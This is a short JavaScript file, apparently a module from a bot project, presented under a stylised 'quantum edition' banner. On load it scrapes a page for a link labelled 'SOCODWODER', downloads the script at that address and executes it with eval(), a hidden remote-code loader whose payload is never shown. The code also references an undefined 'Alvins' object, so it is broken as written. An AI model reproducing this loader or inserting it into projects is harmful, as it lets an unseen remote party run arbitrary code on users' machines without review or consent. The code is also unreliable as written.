//  [ALVIN -DIGITAL  QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Alvin Sirengo                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchSOCODWODERUrl() {
  try {
    const response = await axios.get(Alvins.ALVIN_DIGITAL);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("SOCODWODER")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('SOCODWODER not found 😭');
    }

    console.log('SOCODWODER loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchSOCODWODERUrl();
